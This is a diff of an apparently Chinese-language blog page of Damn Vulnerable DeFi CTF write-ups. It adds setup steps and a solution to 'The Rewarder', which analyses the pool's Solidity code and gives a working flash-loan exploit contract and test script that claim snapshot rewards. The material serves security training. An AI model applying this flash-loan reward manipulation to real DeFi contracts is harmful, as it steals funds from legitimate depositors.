@@ -2559,6 +2559,26 @@
     How to Play
   </a>
   
+    <nav class="md-nav" aria-label="How to Play">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#hardhat" class="md-nav__link">
+    Hardhat
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#foundry" class="md-nav__link">
+    Foundry
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -2632,6 +2652,33 @@
           <li class="md-nav__item">
   <a href="#exploit_1" class="md-nav__link">
     Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-the-rewarder" class="md-nav__link">
+    5. The Rewarder
+  </a>
+  
+    <nav class="md-nav" aria-label="5. The Rewarder">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_2" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    参考资料
   </a>
   
 </li>
@@ -2817,6 +2864,26 @@
     How to Play
   </a>
   
+    <nav class="md-nav" aria-label="How to Play">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#hardhat" class="md-nav__link">
+    Hardhat
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#foundry" class="md-nav__link">
+    Foundry
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -2899,6 +2966,33 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#5-the-rewarder" class="md-nav__link">
+    5. The Rewarder
+  </a>
+  
+    <nav class="md-nav" aria-label="5. The Rewarder">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_2" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    参考资料
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -2932,6 +3026,10 @@
 
         <a href="#flashloan" class="blogging-tag"><code>#flashloan</code></a>
 
+        <a href="#hardhat" class="blogging-tag"><code>#hardhat</code></a>
+
+        <a href="#foundry" class="blogging-tag"><code>#foundry</code></a>
+
     </div>
 
 <style>
@@ -2953,6 +3051,7 @@
     }
 </style>
 <h2 id="how-to-play">How to Play<a class="headerlink" href="#how-to-play" title="Permanent link">&para;</a></h2>
+<h3 id="hardhat">Hardhat<a class="headerlink" href="#hardhat" title="Permanent link">&para;</a></h3>
 <div class="highlight"><pre><span></span><code>$<span class="w"> </span>git<span class="w"> </span>clone<span class="w"> </span>git@github.com:tinchoabbate/damn-vulnerable-defi.git
 $<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>damn-vulnerable-defi
 $<span class="w"> </span>git<span class="w"> </span>checkout<span class="w"> </span>v3.0.0
@@ -2961,6 +3060,15 @@ $<span class="w"> </span>yarn<span class="w"> </span>install
 <ul>
 <li>Code solution in the <code>test/&lt;challenge-name&gt;/&lt;challenge-name&gt;.challenge.js</code></li>
 <li><code>yarn run &lt;challenge-name&gt;</code></li>
+</ul>
+<h3 id="foundry">Foundry<a class="headerlink" href="#foundry" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>git<span class="w"> </span>clone<span class="w"> </span>git@github.com:StErMi/forge-damn-vulnerable-defi.git
+$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>forge-damn-vulnerable-defi
+$<span class="w"> </span>git<span class="w"> </span>submodule<span class="w"> </span>update<span class="w"> </span>--init<span class="w"> </span>--recursive
+</code></pre></div>
+<ul>
+<li>Code solution under the <code>src/test</code></li>
+<li><code>forge test --match-contract &lt;test-contract-name&gt;</code></li>
 </ul>
 <h2 id="1-unstoppable">1. Unstoppable<a class="headerlink" href="#1-unstoppable" title="Permanent link">&para;</a></h2>
 <blockquote>
@@ -3253,13 +3361,126 @@ $<span class="w"> </span>yarn<span class="w"> </span>install
 <span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">hacker</span><span class="p">.</span><span class="nx">exploit</span><span class="p">();</span>
 <span class="p">});</span>
 </code></pre></div>
+<h2 id="5-the-rewarder">5. The Rewarder<a class="headerlink" href="#5-the-rewarder" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.</p>
+<p>Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!</p>
+<p>You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.</p>
+<p>By the way, rumours say a new pool has just launched. Isn’t it offering flash loans of DVT tokens?</p>
+</blockquote>
+<ul>
+<li>
+<p><code>rewardToken</code> 的分发取决于最后一次快照</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">distributeRewards</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">rewards</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">isNewRewardsRound</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">_recordSnapshot</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">totalDeposits</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">accountingToken</span><span class="p">.</span><span class="nx">totalSupplyAt</span><span class="p">(</span><span class="nx">lastSnapshotIdForRewards</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amountDeposited</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">accountingToken</span><span class="p">.</span><span class="nx">balanceOfAt</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">lastSnapshotIdForRewards</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">amountDeposited</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">totalDeposits</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">rewards</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">amountDeposited</span><span class="p">.</span><span class="nx">mulDiv</span><span class="p">(</span><span class="nx">REWARDS</span><span class="p">,</span><span class="w"> </span><span class="nx">totalDeposits</span><span class="p">);</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">rewards</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="nx">_hasRetrievedReward</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">rewardToken</span><span class="p">.</span><span class="nx">mint</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">rewards</span><span class="p">);</span>
+<span class="w">            </span><span class="nx">lastRewardTimestamps</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uint64</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p>每 <span class="arithmatex">\(5\)</span> 天可以快照一次</p>
+<div class="highlight"><pre><span></span><code><span class="nx">uint256</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">REWARDS_ROUND_MIN_DURATION</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">5</span><span class="w"> </span><span class="nx">days</span><span class="p">;</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">_recordSnapshot</span><span class="p">()</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">lastSnapshotIdForRewards</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uint128</span><span class="p">(</span><span class="nx">accountingToken</span><span class="p">.</span><span class="nx">snapshot</span><span class="p">());</span>
+<span class="w">        </span><span class="nx">lastRecordedSnapshotTimestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uint64</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">unchecked</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="o">++</span><span class="nx">roundNumber</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">isNewRewardsRound</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">lastRecordedSnapshotTimestamp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">REWARDS_ROUND_MIN_DURATION</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p>由于不检查 <code>deposit/withdraw</code> 的时间，可在 <span class="arithmatex">\(5\)</span> 天后借助闪电贷 <code>deposit()</code> 创建新的快照并获得 <code>rewardToken</code>，再 <code>withdraw()</code> 归还闪电贷</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">deposit</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">amount</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">revert</span><span class="w"> </span><span class="nx">InvalidDepositAmount</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nx">accountingToken</span><span class="p">.</span><span class="nx">mint</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">distributeRewards</span><span class="p">();</span>
+
+<span class="w">    </span><span class="nx">SafeTransferLib</span><span class="p">.</span><span class="nx">safeTransferFrom</span><span class="p">(</span>
+<span class="w">        </span><span class="nx">liquidityToken</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span>
+<span class="w">        </span><span class="nx">amount</span>
+<span class="w">    </span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">withdraw</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">accountingToken</span><span class="p">.</span><span class="nx">burn</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">SafeTransferLib</span><span class="p">.</span><span class="nx">safeTransfer</span><span class="p">(</span><span class="nx">liquidityToken</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+</ul>
+<h3 id="exploit_2">Exploit<a class="headerlink" href="#exploit_2" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
+
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./FlashLoanerPool.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./TheRewarderPool.sol&quot;</span><span class="p">;</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">TheRewarderHacker</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">TheRewarderPool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">immutable</span><span class="w"> </span><span class="nx">pool</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">IERC20</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">immutable</span><span class="w"> </span><span class="nx">dvt</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">token</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">TheRewarderPool</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">dvt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">lender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">token</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">FlashLoanerPool</span><span class="p">(</span><span class="nx">lender</span><span class="p">).</span><span class="nx">flashLoan</span><span class="p">(</span><span class="mf">1000000</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token</span><span class="p">).</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">token</span><span class="p">).</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">receiveFlashLoan</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">dvt</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">pool</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">pool</span><span class="p">.</span><span class="nx">deposit</span><span class="p">(</span><span class="nx">amount</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">pool</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">(</span><span class="nx">amount</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">dvt</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="nx">it</span><span class="p">(</span><span class="s1">&#39;Execution&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">ethers</span><span class="p">.</span><span class="nx">provider</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&quot;evm_increaseTime&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="mf">5</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">24</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">60</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">60</span><span class="p">]);</span><span class="w"> </span><span class="c1">// 5 days</span>
+
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">TheRewarderHackerFactory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">ethers</span><span class="p">.</span><span class="nx">getContractFactory</span><span class="p">(</span><span class="s1">&#39;TheRewarderHacker&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">player</span><span class="p">);</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">theRewarderHacker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">TheRewarderHackerFactory</span><span class="p">.</span><span class="nx">deploy</span><span class="p">(</span><span class="nx">rewarderPool</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">liquidityToken</span><span class="p">.</span><span class="nx">address</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">theRewarderHacker</span><span class="p">.</span><span class="nx">exploit</span><span class="p">(</span><span class="nx">flashLoanPool</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">rewardToken</span><span class="p">.</span><span class="nx">address</span><span class="p">);</span>
+<span class="p">});</span>
+</code></pre></div>
+<h3 id="_3">参考资料<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<ul>
+<li><a href="https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20Snapshot">ERC20Snapshot</a></li>
+</ul>
 
   <hr>
 <div class="md-source-file">
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年3月16日 16:29:01</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年4月1日 20:32:31</span>
       
     
   </small>
